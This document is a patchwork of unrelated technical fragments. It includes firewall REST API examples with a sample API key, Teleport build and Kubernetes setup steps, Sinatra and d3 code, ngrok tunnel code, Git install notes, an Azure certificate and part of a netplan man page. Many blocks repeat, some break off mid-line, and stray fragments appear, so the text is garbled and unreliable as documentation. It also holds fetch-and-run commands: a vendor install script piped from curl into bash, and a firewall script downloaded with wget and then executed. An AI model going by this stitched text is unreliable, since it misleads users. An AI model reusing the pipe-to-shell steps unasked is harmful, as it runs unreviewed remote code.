Address: Hosts identified by an IP, IP range, subnet or FQDN. Service: A combination of protocol and source/destination port. Address Group: A group of Address objects. Service Group: A group of service objects. With Assimilator one can create/modify/delete objects easily.

POST /api/chile/objects/address key: BDP0NyHZMDfz98kcmD3GuBIQGW9EZTgWGPf56dWnkD3LGM3dZPaZICrKVnTnQWh5YdGLh5SJ9ktg7ReR4le94zyxdigdLTHHf8s Content-Type: application/json { "name" : "Corp_DNS",

} Request: GET /api/headquarters/config

Response: HTTP 200 {"config" : "<...>"}

Request: POST /api/branch/rules {"name" : "Test01", "from" : "trust", "to" : "untrust", "source" : "10.1.1.1", "destination" : "8.8.8.8", "action" : "allow", "application" : "junos-dns-udp"} Response: HTTP 201 {} Request: DELETE /api/branch1/rules {"name" : "Permit Any"} Response: HTTP 200 {}

Request: PUT /api/branch2/objects/address-group {"name" : "Admin_Servers", "members" : [ "Server02" ] } Response: HTTP 200 {}

Request: PATCH /api/paloalto/headquarters/route {"name" : "internal", "destination" : "10.0.0.0/8", "next-hop" : "172.16.1.2" } Response: HTTP 200 {}

cd /opt git clone https://github.com/videlanicolas/assimilator && cd assimilator ./generate_certificate.sh docker build -t assimilator /opt/assimilator/ docker run -d -p 443:443/tcp assimilator

cd /opt git clone https://github.com/videlanicolas/assimilator && cd assimilator ./generate_certificate.sh sudo ./install.sh

POST /firewalls/argentina HTTP/1.1 Content-Type: application/json Authorization: Basic YWRtaW46c2VjcmV0 { "brand" : , "description" : , #JSON object keys for the Firewall brand ... }

GET /firewalls/argentina HTTP/1.1 Content-Type: application/json Authorization: Basic YWRtaW46c2VjcmV0

GET /firewalls/argentina HTTP/1.1 Content-Type: application/json Authorization: Basic YWRtaW46c2VjcmV0 200 OK The key is the Firewall name through the api, in this example the key is ‘argentina’. Inside this JSON object we have the following keys:

"brand" : The Firewall's brand, this will indicate which translator script should be invoked when connecting to this firewall. "primary" : The Firewall's primary IP address, in PaloAlto this should be the Management IP address. "secondary" : The Firewall's secondary IP address, in PaloAlto this should be the Management IP address. "key" : XML API key to be used by Assimilator when connecting to this PaloAlto Firewall. "description" : Some description about this device.

GET /firewalls/datacenter HTTP/1.1 Content-Type: application/json Authorization: Basic YWRtaW46c2VjcmV0 200 OK The key is the Firewall name through the api, in this example the key is ‘datacenter’. Juniper allows users to login either with a password or a certificate, the latter one is encouraged. Inside this JSON object we have the following keys:

"brand" : The Firewall's brand, this will indicate which translator script should be invoked when connecting to this firewall. "primary" : The Firewall's primary IP address, in Juniper this should be the trust IP address. "secondary" : The Firewall's secondary IP address, in Juniper this should the trust IP address. "user" : The username that Assimilator should use while logging in, it usually is 'assimilator'. "privatekey" : Location of the certificate file to be used for SSH authentication, if not specified then user/password will be used. "privatekeypass" : The password to decrypt the private key from the certificate, if not specified then user/password will be used. "pass" : The password to be used for SSH login, this is used if privatekey and privatekeypass is not specified. "port" : The SSH port on the Firewall, usually 22. "description" : Some description about this device.

GET /api/argentina/config key: BDP0NyHZMDfz98kcmD3GuBIQGW9EZTgWGPf56dWnkD3LGM3dZPaZICrKVnTnQWh5YdGLh5SJ9ktg7ReR4le94zyxdigdLTHHf8s Content-Type: application/json 200 OK Rules

/api//rules

Get all rules in the selected Firewall. This can be filtered with URL arguments.

Example (PaloAlto)

GET /api/argentina/rules key: BDP0NyHZMDfz98kcmD3GuBIQGW9EZTgWGPf56dWnkD3LGM3dZPaZICrKVnTnQWh5YdGLh5SJ9ktg7ReR4le94zyxdigdLTHHf8s Content-Type: application/json 200 OK Example with arguments (PaloAlto)

GET /api/argentina/rules?from=dmz&to=untrust key: BDP0NyHZMDfz98kcmD3GuBIQGW9EZTgWGPf56dWnkD3LGM3dZPaZICrKVnTnQWh5YdGLh5SJ9ktg7ReR4le94zyxdigdLTHHf8s Content-Type: application/json 200 OK To add a rule one simply change the method to POST and sends one of these JSON objects in the body of the request.

POST /api/brasil/rules key: BDP0NyHZMDfz98kcmD3GuBIQGW9EZTgWGPf56dWnkD3LGM3dZPaZICrKVnTnQWh5YdGLh5SJ9ktg7ReR4le94zyxdigdLTHHf8s Content-Type: application/json { "log-end": true, "qos": { "marking": null, "type": null }, "negate-source": false, "disabled": true, "rule-type": "universal", "tag": [], "log-start": false, "hip-profiles": [], "negate-destination": false, "description": null, "category": [ "any" ], "from": [ "dmz" ], "service": [ "any" ], "source": [ "any" ], "destination": [ "10.10.50.2", ], "application": [ "web-browsing", "ssl" ], "profile-setting": null, "log-setting": null, "to": [ "untrust" ], "schedule": null, "source-user": [ "any" ], "icmp-unreachable": false, "name": "Internet access", "disable-server-response-inspection": false, "action": "allow" }

POST /api/brasil/rules key: BDP0NyHZMDfz98kcmD3GuBIQGW9EZTgWGPf56dWnkD3LGM3dZPaZICrKVnTnQWh5YdGLh5SJ9ktg7ReR4le94zyxdigdLTHHf8s Content-Type: application/json { "name" : "Some Rule Name", "source" : { "192.168.1.50", "192.168.1.40" } } To append new objects to a rule use PATCH, here we add objects to destination.

POST /api/brasil/rules key: BDP0NyHZMDfz98kcmD3GuBIQGW9EZTgWGPf56dWnkD3LGM3dZPaZICrKVnTnQWh5YdGLh5SJ9ktg7ReR4le94zyxdigdLTHHf8s Content-Type: application/json { "name" : "Some Rule Name", "destination" : { "100.200.100.10" } } Match

/api//rules/match

A very useful resource is match. With it one can test a source, destination and port to check if the Firewall allows that connection. Many Firewalls already have this funcionality, other don’t (AWS). What they lack is the ease of use. Assimilator only requires source, destination and port (optionally a protocol), other required input by the Firewalls (such as dmz zones) are resolved by Assimilator either through route tables or configuration. If the access is granted then it returns the rule that allows it.

GET /api/uruguay/rules/match?source=192.168.4.5&destination=100.150.100.150&port=443 key: BDP0NyHZMDfz98kcmD3GuBIQGW9EZTgWGPf56dWnkD3LGM3dZPaZICrKVnTnQWh5YdGLh5SJ9ktg7ReR4le94zyxdigdLTHHf8s Content-Type: application/json 200 ok Objects

/api//objects/<address|address-group|service|service-group>

Firewall objects identify hosts and ports in the rules, basically there are four type of objects:

Address: Hosts identified by an IP, IP range, subnet or FQDN. Service: A combination of protocol and source/destination port. Address Group: A group of Address objects. Service Group: A group of service objects. With Assimilator one can create/modify/delete objects easily.

POST /api/chile/objects/address key: BDP0NyHZMDfz98kcmD3GuBIQGW9EZTgWGPf56dWnkD3LGM3dZPaZICrKVnTnQWh5YdGLh5SJ9ktg7ReR4le94zyxdigdLTHHf8s Content-Type: application/json { "name" : "Corp_DNS",

}

$ portal open 80 Forwarding: portals.rs:39755 -> 127.0.0.1:80

$ portal open 8888 192.168.0.1:3306 # Opens multiple tunnel at once Forwarding: portals.rs:41657 -> 192.168.0.1:3306 Forwarding: portals.rs:38913 -> 127.0.0.1:8888

$ portal open 8000:8000 # Specifies the remote port (may fail if it's in use) Forwarding: portals.rs:8000 -> 127.0.0.1:8000

           GNU LESSER GENERAL PUBLIC LICENSE
               Version 3, 29 June 2007
Convey the Minimal Corresponding Source under the terms of this License, and the Corresponding Application Code in a form suitable for, and under terms that permit, the user to recombine or relink the Application with a modified version of the Linked Version to produce a modified Combined Work, in the manner specified by section 6 of the GNU GPL for conveying Corresponding Source.

Use a suitable shared library mechanism for linking with the Library. A suitable mechanism is one that (a) uses at run time a copy of the Library already present on the user's computer system, and (b) will operate properly with a modified version of the Library that is interface-compatible with the Linked Version. wget https://github.com/LasVegasCoder/FireWALL/blob/master/princeserverguard.ipt

chmod +x princeserverguard.ipt

./princeserverguard.ipt

Then watch your traffic with: watch -d -n1 iptables -vnL

make -C build.assets build-binaries

git clone https://github.com/gravitational/teleport.git cd teleport

make full

make build/tsh TOUCHID=yes

make build/tsh FIDO2=dynamic

export PKG_CONFIG_PATH="$(brew --prefix openssl@3)/lib/pkgconfig" make build/tsh FIDO2=dynamic

sudo mkdir -p -m0700 /var/lib/teleport sudo chown $USER /var/lib/teleport

go install github.com/githubnemo/CompileDaemon@latest

make teleport-hot-reload

make teleport-hot-reload TELEPORT_ARGS='start --config=/path/to/config.yaml'

make docker-ui

Run Teleport as a single-node cluster in development mode:

DEBUG=1 ./build/teleport start -d

go get github.com/new/dependency

go get github.com/new/dependency@version

go get -u github.com/new/dependency

go get -u all

tctl version

Teleport v15.0.1 git:api/14.0.0-gd1e081e go1.21

tsh version Teleport v15.0.1 go1.21 Proxy version: 15.0.1 Proxy: teleport.example.com

tsh login --proxy= teleport.example.com --user= email@example.com tctl status Cluster teleport.example.com Version 15.0.1 CA pin sha256:abdc1245efgh5678abdc1245efgh5678abdc1245efgh5678abdc1245efgh5678

kubectl config get-contexts

CONTEXT_NAME=context-name kubectl config use-context ${CONTEXT_NAME?}

curl -OL
https://raw.githubusercontent.com/gravitational/teleport/v15.0.1/examples/k8s-auth/get-kubeconfig.sh

$ bash get-kubeconfig.sh The script is successful if you see this message:

Done!

tctl tokens add --type=kube --format=text --ttl=1h

echo join-token | sudo tee /tmp/token

curl https://goteleport.com/static/install.sh | bash -s 15.0.1 version: v3 teleport: join_params: token_name: "/tmp/token" method: token proxy_server: teleport.example.com:443 auth_service: enabled: off proxy_service: enabled: off ssh_service: enabled: off kubernetes_service: enabled: "yes" kubeconfig_file: "/var/lib/teleport/kubeconfig" labels: "region": "us-east1"

sudo systemctl enable teleport sudo systemctl start teleport

kubectl config view
-o jsonpath="{.contexts[?(@.name=="$(kubectl config current-context)")].context.user}"

kind: role metadata: name: kube-access version: v7 spec: allow: kubernetes_labels: '': '' kubernetes_resources: - kind: '' namespace: '' name: '' verbs: [''] kubernetes_groups: - viewers kubernetes_users: # Replace USER with the Kubernetes user for your current context. - USER deny: {}

tctl create -f kube-access.yaml

tctl get github/github --with-secrets > github.yaml

teams_to_roles: - organization: octocats team: admins roles: - access

  - kube-access
Apply your changes:

tctl create -f github.yaml

apiVersion: rbac.authorization.k8s.io/v1 kind: ClusterRoleBinding metadata: name: viewers-crb subjects:

kind: Group
Bind the group "viewers", corresponding to the kubernetes_groups we assigned our "kube-access" role above

name: viewers apiGroup: rbac.authorization.k8s.io roleRef: kind: ClusterRole
"view" is a default ClusterRole that grants read-only access to resources

See: https://kubernetes.io/docs/reference/access-authn-authz/rbac/#user-facing-roles

name: view apiGroup: rbac.authorization.k8s.io
$ kubectl apply -f viewers-bind.yaml Log out of Teleport and log in again.

Step 4/4. Access your Kubernetes cluster After Teleport starts with the above config, you should be able to see all new clusters:

tsh kube ls Kube Cluster Name Labels Selected

my-cluster region=us-east-1 To access your cluster, run the following command, replacing my-cluster with the name of the cluster you would like to access:

tsh kube login my-cluster Logged into kubernetes cluster "my-cluster". Try 'kubectl version' to test the connection.

make -C build.assets build-binaries

git clone https://github.com/gravitational/teleport.git cd teleport

make full

make build/tsh TOUCHID=yes

make build/tsh FIDO2=dynamic

export PKG_CONFIG_PATH="$(brew --prefix openssl@3)/lib/pkgconfig" make build/tsh FIDO2=dynamic

sudo mkdir -p -m0700 /var/lib/teleport sudo chown $USER /var/lib/teleport
file; 2:blue attack one;3:blue attack Mul;4:check
				
                one;5:check Mul)

CLIENT_ID = ENV['GH_GRAPH_CLIENT_ID']
CLIENT_SECRET = ENV['GH_GRAPH_SECRET_ID']

enable :sessions

set :github_options, {
  :scopes    => "repo",
  :secret    => CLIENT_SECRET,
  :client_id => CLIENT_ID,
  :callback_url => "/"
}

register Sinatra::Auth::Github

get '/' do
  if !authenticated?
    authenticate!
  else
    access_token = github_user["token"]
  end
end

var barWidth = 40;
var width = (barWidth + 10) * data.length;
var height = 300;

var x = d3.scale.linear().domain([0, data.length]).range([0, width]);
var y = d3.scale.linear().domain([0, d3.max(data, function(datum) { return datum.count; })]).
  rangeRound([0, height]);

// add the canvas to the DOM
var languageBars = d3.select("#lang_freq").
  append("svg:svg").
  attr("width", width).
  attr("height", height);

languageBars.selectAll("rect").
  data(data).
  enter().
  append("svg:rect").
  attr("x", function(datum, index) { return x(index); }).
  attr("y", function(datum) { return height - y(datum.count); }).
  attr("height", function(datum) { return y(datum.count); }).
  attr("width", barWidth);

languageBars.selectAll("text").
  data(data).
  enter().
  append("svg:text").
  attr("x", function(datum, index) { return x(index) + barWidth; }).
  attr("y", function(datum) { return height - y(datum.count); }).
  attr("dx", -barWidth/2).
  attr("dy", "1.2em").
  attr("text-anchor", "middle").
  text(function(datum) { return datum.count;});

languageBars.selectAll("text.yAxis").
  data(data).
  enter().append("svg:text").
  attr("x", function(datum, index) { return x(index) + barWidth; }).
  attr("y", height).
  attr("dx", -barWidth/2).
  attr("text-anchor", "middle").
  text(function(datum) { return datum.language;}).
  attr("transform", "translate(0, 18)").
  attr("class", "yAxis");

  var treemap = d3.layout.treemap()
      .children(childrenFunction)
      .size([width,height])
      .value(sizeFunction);

  var div = d3.select(elementSelector)
      .append("div")
      .style("position","relative")
      .style("width",width + "px")
      .style("height",height + "px");

  div.data(language_bytes).selectAll("div")
      .data(function(d){return treemap.nodes(d);})
      .enter()
      .append("div")
      .attr("class","cell")
      .style("background",function(d){ return colorScale(colorFunction(d));})
      .call(cell)
      .text(nameFunction);

CLIENT_ID = ENV['GH_GRAPH_CLIENT_ID']
CLIENT_SECRET = ENV['GH_GRAPH_SECRET_ID']

enable :sessions

set :github_options, {
  :scopes    => "repo",
  :secret    => CLIENT_SECRET,
  :client_id => CLIENT_ID,
  :callback_url => "/"
}

register Sinatra::Auth::Github

get '/' do
  if !authenticated?
    authenticate!
  else
    access_token = github_user["token"]
  end
end

var barWidth = 40;
var width = (barWidth + 10) * data.length;
var height = 300;

var x = d3.scale.linear().domain([0, data.length]).range([0, width]);
var y = d3.scale.linear().domain([0, d3.max(data, function(datum) { return datum.count; })]).
  rangeRound([0, height]);

// add the canvas to the DOM
var languageBars = d3.select("#lang_freq").
  append("svg:svg").
  attr("width", width).
  attr("height", height);

languageBars.selectAll("rect").
  data(data).
  enter().
  append("svg:rect").
  attr("x", function(datum, index) { return x(index); }).
  attr("y", function(datum) { return height - y(datum.count); }).
  attr("height", function(datum) { return y(datum.count); }).
  attr("width", barWidth);

languageBars.selectAll("text").
  data(data).
  enter().
  append("svg:text").
  attr("x", function(datum, index) { return x(index) + barWidth; }).
  attr("y", function(datum) { return height - y(datum.count); }).
  attr("dx", -barWidth/2).
  attr("dy", "1.2em").
  attr("text-anchor", "middle").
  text(function(datum) { return datum.count;});

languageBars.selectAll("text.yAxis").
  data(data).
  enter().append("svg:text").
  attr("x", function(datum, index) { return x(index) + barWidth; }).
  attr("y", height).
  attr("dx", -barWidth/2).
  attr("text-anchor", "middle").
  text(function(datum) { return datum.language;}).
  attr("transform", "translate(0, 18)").
  attr("class", "yAxis");

  var treemap = d3.layout.treemap()
      .children(childrenFunction)
      .size([width,height])
      .value(sizeFunction);

  var div = d3.select(elementSelector)
      .append("div")
      .style("position","relative")
      .style("width",width + "px")
      .style("height",height + "px");

  div.data(language_bytes).selectAll("div")
      .data(function(d){return treemap.nodes(d);})
      .enter()
      .append("div")
      .attr("class","cell")
      .style("background",function(d){ return colorScale(colorFunction(d));})
      .call(cell)
      .text(nameFunction);

let tun = ngrok::Session::builder()
    // Read the token from the NGROK_AUTHTOKEN environment variable
    .authtoken_from_env()
    // Connect the ngrok session
    .connect()
    .await?
    // Start a tunnel with an HTTP edge
    .http_endpoint()
    .listen()
    .await?;

println!("Tunnel started on URL: {:?}", tun.url());

// Instead of binding a local port like so:
// axum::Server::bind(&"0.0.0.0:8000".parse().unwrap())
// Run it with an ngrok tunnel instead!
axum::Server::builder(tun)
    .serve(app.into_make_service_with_connect_info::<SocketAddr>())
    .await
    .unwrap();

Ok(())

passphrase: ${{ 010203040506070801020304050607080102030405060708 }}

passphrase: ${{ 010203040506070801020304050607080102030405060708 }}

passphrase: ${{ 010203040506070801020304050607080102030405060708 }}

passphrase: ${{ 010203040506070801020304050607080102030405060708}}
fingerprint: "5e:8d:c4:ad:e7:af:6e:27:8a:d6:13:e4:79:ad:0b:81"

0 = key does not expire

let tun = ngrok::Session::builder()
    // Read the token from the NGROK_AUTHTOKEN environment variable
    .authtoken_from_env()
    // Connect the ngrok session
    .connect()
    .await?
    // Start a tunnel with an HTTP edge
    .http_endpoint()
    .listen()
    .await?;

println!("Tunnel started on URL: {:?}", tun.url());

// Instead of binding a local port like so:
// axum::Server::bind(&"0.0.0.0:8000".parse().unwrap())
// Run it with an ngrok tunnel instead!
axum::Server::builder(tun)
    .serve(app.into_make_service_with_connect_info::<SocketAddr>())
    .await
    .unwrap();

Ok(())

passphrase: ${{ 010203040506070801020304050607080102030405060708 }}

passphrase: ${{ 010203040506070801020304050607080102030405060708 }}

passphrase: ${{ 010203040506070801020304050607080102030405060708 }}

passphrase: ${{ 010203040506070801020304050607080102030405060708}}
fingerprint: "5e:8d:c4:ad:e7:af:6e:27:8a:d6:13:e4:79:ad:0b:81"

          GNU LESSER GENERAL PUBLIC LICENSE

              Version 3, 29 June 2007

Git installation

	Git installation

$ make prefix=/usr all doc info ;# as yourself
# make prefix=/usr install install-doc install-html install-info ;# as root

$ make configure ;# as yourself
$ ./configure --prefix=/usr ;# as yourself
$ make all doc ;# as yourself
# make install install-doc install-html;# as root

$ make prefix=/usr profile
# make prefix=/usr PROFILE=BUILD install

$ make prefix=/usr profile-fast
# make prefix=/usr PROFILE=BUILD install

$ make profile-install

prefix=/usr perllibdir=/usr/$(/usr/bin/perl -MConfig -wle 'print substr $Config{installsitelib}, 1 + length $Config{siteprefixexp}')


Use a tarball as a starting point for a new repository.::
+
------------
$ tar zxf frotz.tar.gz
$ cd frotz
$ git init
$ git add . <1>
$ git commit -m "import of frotz source tree."
$ git tag v2.43 <2>
------------
+
-------------------------------------------

A repository administrator uses the following tools to set up
and maintain access to the repository by developers.

  * linkgit:git-daemon[1] to allow anonymous download from
    repository.

  * linkgit:git-shell[1] can be used as a 'restricted login shell'
    for shared central repository users.

  * linkgit:git-http-backend[1] provides a server side implementation
    of Git-over-HTTP ("Smart http") allowing both fetch and push services.

  * linkgit:gitweb[1] provides a web front-end to Git repositories,
    which can be set-up using the linkgit:git-instaweb[1] script.

link:howto/update-hook-example.html[update hook howto] has a good
example of managing a shared central repository.

In addition there are a number of other widely deployed hosting, browsing
and reviewing solutions such as:

  * gitolite, gerrit code review, cgit and others.

Examples

`@` > `+` > `/` > `,`

layout = "LOCAL,BASE,REMOTE / MERGED"

${{ fa94d7e31ab6bfd9f3c06686aec51c9f63cd3c3f}}
env: # Or as an environment variable
super_secret: $

  # GitHub CLI api

`@` > `+` > `/` > `,`

layout = "LOCAL,BASE,REMOTE / MERGED"

passphrase: ${{ 010203040506070801020304050607080102030405060708 }}

passphrase: ${{ 010203040506070801020304050607080102030405060708 }}

passphrase: ${{ 010203040506070801020304050607080102030405060708 }}

passphrase: ${{ 010203040506070801020304050607080102030405060708}}
fingerprint: "5e:8d:c4:ad:e7:af:6e:27:8a:d6:13:e4:79:ad:0b:81"

${{ 7F899AE2FB73159DD68A1B20C3AFA9ED971BB365
passphrase: $

           |                     |    ^

          (1)                   (3)  (4)

           V                     v    |

      +----------------------------------+

      |        Language Team XX          |


      +----------------------------------+

      "msgcat --no-location -"


      "msgcat --add-location=file -"

 _(reset_type_names[reset_type]));


	Git installation


          GNU LESSER GENERAL PUBLIC LICENSE

              Version 3, 29 June 2007

$VALID_NAME... ";
+# compare if name found
+NAME=$

Git installation

$ make configure ;# as yourself
$ ./configure --prefix=/usr ;# as yourself
$ make all doc ;# as yourself
# make install install-doc install-html;# as root

$ make prefix=/usr profile
# make prefix=/usr PROFILE=BUILD install

$ make prefix=/usr profile-fast
# make prefix=/usr PROFILE=BUILD install


$ make profile-install


Use a tarball as a starting point for a new repository.::
+
------------
$ tar zxf frotz.tar.gz
$ cd frotz
$ git init
$ git add . <1>
$ git commit -m "import of frotz source tree."
$ git tag v2.43 <2>
------------
+
-------------------------------------------

A repository administrator uses the following tools to set up
and maintain access to the repository by developers.

  * linkgit:git-daemon[1] to allow anonymous download from
    repository.

  * linkgit:git-shell[1] can be used as a 'restricted login shell'
    for shared central repository users.

  * linkgit:git-http-backend[1] provides a server side implementation
    of Git-over-HTTP ("Smart http") allowing both fetch and push services.

  * linkgit:gitweb[1] provides a web front-end to Git repositories,
    which can be set-up using the linkgit:git-instaweb[1] script.

link:howto/update-hook-example.html[update hook howto] has a good
example of managing a shared central repository.

In addition there are a number of other widely deployed hosting, browsing
and reviewing solutions such as:

  * gitolite, gerrit code review, cgit and others.

Examples

`@` > `+` > `/` > `,`


layout = "LOCAL,BASE,REMOTE / MERGED"

  Microsoft Azure Certificate
  
  --header--<X509Certificate>MIIDPjCCAabcAwIBAgIQsRiM0jheFZhKk49YD0SK1TAJBgUrDgMCHQUAMC0xKzApBgNVBAMTImFjY291bnRzLmFjY2Vzc2NvbnRyb2wud2luZG93cy5uZXQwHhcNMTQwMTAxMDcwMDAwWhcNMTYwMTAxMDcwMDAwWjAtMSswKQYDVQQDEyJhY2NvdW50cy5hY2Nlc3Njb250cm9sLndpbmRvd3MubmV0MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAkSCWg6q9iYxvJE2NIhSyOiKvqoWCO2GFipgH0sTSAs5FalHQosk9ZNTztX0ywS/AHsBeQPqYygfYVJL6/EgzVuwRk5txr9e3n1uml94fLyq/AXbwo9yAduf4dCHTP8CWR1dnDR+Qnz/4PYlWVEuuHHONOw/blbfdMjhY+C/BYM2E3pRxbohBb3x//CfueV7ddz2LYiH3wjz0QS/7kjPiNCsXcNyKQEOTkbHFi3mu0u13SQwNddhcynd/GTgWN8A+6SN1r4hzpjFKFLbZnBt77ACSiYx+IHK4Mp+NaVEi5wQtSsjQtI++XsokxRDqYLwus1I1SihgbV/STTg5enufuwIDAQABo2IwYDBeBgNVHQEEVzBVgBDLebM6bK3BjWGqIBrBNFeNoS8wLTErMCkGA1UEAxMiYWNjb3VudHMuYWNjZXNzY29udHJvbC53aW5kb3dzLm5ldIIQsRiM0jheFZhKk49YD0SK1TAJBgUrDgMCHQUAA4IBAQCJ4JApryF77EKC4zF5bUaBLQHQ1PNtA1uMDbdNVGKCmSp8M65b8h0NwlIjGGGy/unK8P6jWFdm5IlZ0YPTOgzcRZguXDPj7ajyvlVEQ2K2ICvTYiRQqrOhEhZMSSZsTKXFVwNfW6ADDkN3bvVOVbtpty+nBY5UqnI7xbcoHLZ4wYD251uj5+lo13YLnsVrmQ16NCBYq2nQFNPuNJw6t3XUbwBHXpF46aLT1/eGf/7Xx6iy8yPJX4DyrpFTutDz882RWofGEO5t4Cw+zZg70dJ/hH/ODYRMorfXEW+8uKmXMKmX2wyxMKvfiPbTy5LmAU8Jvjs2tLg4rOBcXWLAIarZ</X509Certificate>


${{ fa94d7e31ab6bfd9f3c06686aec51c9f63cd3c3f}}
env: # Or as an environment variable
super_secret: $

`@` > `+` > `/` > `,`


layout = "LOCAL,BASE,REMOTE / MERGED"

passphrase: ${{ 010203040506070801020304050607080102030405060708 }}

passphrase: ${{ 010203040506070801020304050607080102030405060708 }}

passphrase: ${{ 010203040506070801020304050607080102030405060708 }}

passphrase: ${{ 010203040506070801020304050607080102030405060708}}
fingerprint: "5e:8d:c4:ad:e7:af:6e:27:8a:d6:13:e4:79:ad:0b:81"
    -v "$(pwd)/etc-pihole:/etc/pihole:z" \
    -v "$(pwd)/etc-dnsmasq.d:/etc/dnsmasq.d:z" \

network:
    ethernets:
        ens160:
            dhcp4: true
            dhcp4-overrides:
                use-dns: false
            nameservers:
                addresses: [127.0.0.1]
    version: 2


       netplan - YAML network configuration abstraction for various backends

SYNOPSIS

       netplan [ COMMAND | help ]

COMMANDS

       See netplan help for a list of available commands on this system.

DESCRIPTION

   Introduction
       Distribution  installers, cloud instantiation, image builds for particular devices, or any
       other way to deploy an operating system put its desired network  configuration  into  YAML
       configuration file(s).  During early boot, the netplan "network renderer" runs which reads
       /{lib,etc,run}/netplan/*.yaml and writes configuration to /run  to  hand  off  control  of
       devices to the specified networking daemon.

       • Configured  devices get handled by systemd-networkd by default, unless explicitly marked
         as managed by a specific renderer (NetworkManager)

       • Devices not covered by the network config do not get touched at all.

       • Usable in initramfs (few dependencies and fast)

       • No persistent generated config, only original YAML config

       • Parser supports multiple config files to allow  applications  like  libvirt  or  lxd  to
         package  up  expected  network  config (virbr0, lxdbr0), or to change the global default
         policy to use NetworkManager for everything.

       • Retains  the  flexibility  to  change  backends/policy  later  or  adjust  to   removing
         NetworkManager, as generated configuration is ephemeral.

   General structure
       netplan's configuration files use the YAML (http://yaml.org/spec/1.1/current.html) format.
       All  /{lib,etc,run}/netplan/*.yaml  are   considered.    Lexicographically   later   files
       (regardless  of  in  which  directory they are) amend (new mapping keys) or override (same
       mapping keys) previous ones.  A file in /run/netplan completely shadows a file  with  same
       name  in  /etc/netplan,  and a file in either of those directories shadows a file with the
       same name in /lib/netplan.

       The top-level node in a netplan configuration file is a  network:  mapping  that  contains
       version: 2  (the  YAML currently being used by curtin, MaaS, etc.  is version 1), and then
       device definitions grouped  by  their  type,  such  as  ethernets:,  modems:,  wifis:,  or
       bridges:.   These  are the types that our renderer can understand and are supported by our
       backends.

       Each type block contains device definitions as a map where the keys (called "configuration
       IDs") are defined as below.

   Device configuration IDs
       The  key  names  below  the  per-device-type  definition maps (like ethernets:) are called
       "ID"s.  They must be unique throughout the  entire  set  of  configuration  files.   Their
       primary  purpose  is  to  serve  as  anchor  names  for  composite devices, for example to
       enumerate the members of a bridge that is currently being defined.

       If an interface is defined with an ID in a configuration file; it will be  brought  up  by
       the  applicable  renderer.   To  not  have netplan touch an interface at all, it should be
       completely omitted from the netplan configuration files.

       There are two physically/structurally different classes of device definitions, and the  ID
       field has a different interpretation for each:

       Physical devices
              (Examples: ethernet, modem, wifi) These can dynamically come and go between reboots
              and even during runtime (hotplugging).  In the generic case, they can  be  selected
              by  match:  rules  on  desired  properties, such as name/name pattern, MAC address,
              driver, or device paths.  In general these will match any number of devices (unless
              they refer to properties which are unique such as the full path or MAC address), so
              without further knowledge about the hardware these will always be considered  as  a
              group.

              It  is valid to specify no match rules at all, in which case the ID field is simply
              the interface name to be matched.  This is mostly useful if you want to keep simple
              cases  simple,  and  it's how network device configuration has been done for a long
              time.

              If there are match: rules, then the ID field is a purely opaque name which is  only
              being used for references from definitions of compound devices in the config.

       Virtual devices
              (Examples:  veth,  bridge,  bond)  These  are fully under the control of the config
              file(s) and the network stack.  I.  e.  these devices are being created instead  of
              matched.   Thus match: and set-name: are not applicable for these, and the ID field
              is the name of the created virtual device.

   Common properties for physical device types
       match (mapping)
              This selects a subset of available physical devices by various hardware properties.
              The  following  configuration  will  then apply to all matching devices, as soon as
              they appear.  All specified properties must match.

              name (scalar)
                     Current interface name.  Globs are supported, and the primary use  case  for
                     matching  on  names, as selecting one fixed name can be more easily achieved
                     with having no match: at all and just using the ID (see above).   Note  that
                     currently only networkd supports globbing, NetworkManager does not.

              macaddress (scalar)
                     Device's  MAC  address  in  the  form  "XX:XX:XX:XX:XX:XX".   Globs  are not
                     allowed.

              driver (scalar)
                     Kernel driver name, corresponding to the DRIVER udev  property.   Globs  are
                     supported.  Matching on driver is only supported with networkd.

              Examples:

              • all cards on second PCI bus:

                       match:
                         name: enp2*

              • fixed MAC address:

                       match:
                         macaddress: 11:22:33:AA:BB:FF

              • first card of driver ixgbe:

                       match:
                         driver: ixgbe
                         name: en*s0

       set-name (scalar)
              When  matching  on  unique  properties  such  as  path  or  MAC, or with additional
              assumptions such as "there will only ever be one wifi device", match rules  can  be
              written so that they only match one device.  Then this property can be used to give
              that device a more specific/desirable/nicer  name  than  the  default  from  udev's
              ifnames.   Any  additional  device that satisfies the match rules will then fail to
              get renamed and keep the original kernel name (and dmesg will show an error).

       wakeonlan (bool)
              Enable wake on LAN.  Off by default.

       emit-lldp (bool)
              (networkd backend only) Whether to emit LLDP packets.  Off by default.

   Common properties for all device types
       renderer (scalar)
              Use the given networking backend for  this  definition.   Currently  supported  are
              networkd and NetworkManager.  This property can be specified globally in networks:,
              for a device type (in e.  g.  ethernets:) or for a  particular  device  definition.
              Default is networkd.

              The  renderer property has one additional acceptable value for vlan objects (i.  e.
              defined in vlans:): sriov.  If a vlan is defined with the  sriov  renderer  for  an
              SR-IOV  Virtual  Function  interface, this causes netplan to set up a hardware VLAN
              filter for it.  There can be only one defined per VF.

       dhcp4 (bool)
              Enable DHCP for IPv4.  Off by default.

       dhcp6 (bool)
              Enable DHCP for IPv6.  Off by default.  This covers both stateless DHCP - where the
              DHCP  server supplies information like DNS nameservers but not the IP address - and
              stateful  DHCP,  where  the  server  provides  both  the  address  and  the   other
              information.

              If  you are in an IPv6-only environment with completely stateless autoconfiguration
              (SLAAC with RDNSS), this option can be set to cause the interface to be brought up.
              (Setting  accept-ra  alone  is not sufficient.) Autoconfiguration will still honour
              the contents of the router advertisement and only use DHCP if requested in the RA.

              Note that rdnssd(8) is required to use RDNSS with networkd.  No extra  software  is
              required for NetworkManager.

       ipv6-mtu (scalar)
              Set  the IPv6 MTU (only supported with networkd backend).  Note that needing to set
              this is an unusual requirement.

              Requires feature: ipv6-mtu

       ipv6-privacy (bool)
              Enable IPv6 Privacy Extensions (RFC 4941) for the specified interface,  and  prefer
              temporary  addresses.   Defaults  to  false  -  no  privacy  extensions.   There is
              currently no way to have a private address but prefer the public address.

       link-local (sequence of scalars)
              Configure the link-local addresses to bring  up.   Valid  options  are  'ipv4'  and
              'ipv6',  which respectively allow enabling IPv4 and IPv6 link local addressing.  If
              this field is not defined, the default is to enable only IPv6 link-local addresses.
              If  the  field is defined but configured as an empty set, IPv6 link-local addresses
              are disabled as well as IPv4 link- local addresses.

              This feature enables or disables link-local  addresses  for  a  protocol,  but  the
              actual  implementation differs per backend.  On networkd, this directly changes the
              behavior  and  may  add  an  extra  address  on  an  interface.   When  using   the
